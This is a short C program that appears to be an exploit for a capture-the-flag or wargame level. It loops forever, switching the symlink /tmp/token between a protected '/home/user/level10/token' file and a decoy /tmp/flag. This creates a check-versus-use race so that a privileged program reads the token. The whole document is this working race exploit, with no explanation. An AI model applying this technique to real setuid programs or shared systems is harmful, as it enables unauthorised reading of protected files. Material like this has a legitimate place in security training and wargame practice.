#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <fcntl.h>
#include <errno.h>
#include <fcntl.h>

int main()
{
    int i;

    i = 0;
    open("/tmp/flag", 777);
    while (1)
    {

        if (i % 2 == 0 && symlink("/home/user/level10/token", "/tmp/token") != 0)
        {
            printf("Failed link: %s\n", "/home/user/level10/token");
            return -1;
        }
        else if (i % 2 == 1 && symlink("/tmp/flag", "/tmp/token") != 0)
        {
            printf("Failed link: %s\n", "/tmp/flag");
            return -1;
        }
        i++;
        if (i == 2)
            i = 0;
        if (unlink("/tmp/token") != 0)
        {
            printf("Cannot remove the file\n");
            return -1;
        }
    }
    return 0;
}